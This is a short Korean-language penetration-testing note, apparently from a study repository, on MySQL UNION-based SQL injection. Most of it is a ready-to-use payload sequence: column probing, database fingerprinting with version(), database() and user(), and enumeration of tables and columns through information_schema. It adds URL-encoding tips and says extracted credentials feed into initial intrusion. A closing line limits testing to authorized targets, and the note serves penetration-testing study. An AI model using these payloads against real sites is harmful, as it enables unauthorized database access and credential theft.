# MySQL UNION SQLi: 데이터 추출

## 개요

UNION SELECT로 결과 테이블에 원하는 데이터를 끼워 넣는 단계다. UNION은 앞 SELECT와 컬럼 수가 같아야만 작동하므로, PoC 단계의 선행 작업이 필요하다.

| 선행 작업 | 문서 |
|---|---|
| 문자열 탈출(`'`)·컬럼 수 확정(`ORDER BY n`)·주석(`-- -`) 원리 | [MySQL SQLi PoC](./mysql_order_by_sqli.md) |

```sql
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3     -- 에러
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3,4   -- 성공
```

## 데이터 추출 순서

```sql
-- 1. 어느 자리가 화면에 출력되는지 확인
' UNION SELECT 'A','B','C','D'-- -

-- 2. DB 지문
' UNION SELECT version(),database(),user(),'D'-- -

-- 3. 테이블 목록(출력 행 수 제한 대비 GROUP_CONCAT)
' UNION SELECT GROUP_CONCAT(table_name),2,3,4 FROM information_schema.tables WHERE table_schema=database()-- -

-- 4. 컬럼 목록
' UNION SELECT GROUP_CONCAT(column_name),2,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

추출한 크리덴셜은 로그인 페이지 대입 등 초기 침투로 이어진다.

## URL 인코딩

URL로 보낼 때는 공백을 `+`, `'`를 `%27`, `,`를 `%2C`로 인코딩한다. (쿼리스트링 기준. 경로에는 `+`가 리터럴로 전달되므로 `%20`을 쓴다.)

## 주의

- 모든 시도는 허가된 대상에서만 실행한다.
- 실전 적용 사례: [Robust 롸잇업](../../../../Robust/README.md)
